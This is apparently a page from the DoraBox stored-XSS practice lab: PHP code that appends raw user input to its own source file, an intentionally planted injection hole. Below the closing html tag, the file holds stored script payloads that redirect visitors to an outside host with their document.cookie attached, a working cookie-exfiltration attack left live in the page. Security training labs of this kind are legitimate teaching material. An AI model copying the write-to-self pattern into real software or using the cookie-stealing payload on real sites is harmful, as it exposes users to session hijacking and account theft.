<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<title>DoraBox - 存储XSS</title>
</head>
<body>
<?php
	include "../class/function.class.php";
	$p = new Func("POST","name");
	$p -> con_html();
	if (isset($_REQUEST['submit'])) {
		$name = $_REQUEST['name'];
		echo $p -> con_function('file_put_contents',__FILE__,$name,FILE_APPEND);
	}
?>
</body>
</html>
123<h1>123</h1><script>window.location="http://zewodag.exeye.io/?cookie=" %2b document.cookie</script><script>window.location="http://zewodag.exeye.io/?cookie=" + document.cookie</script>123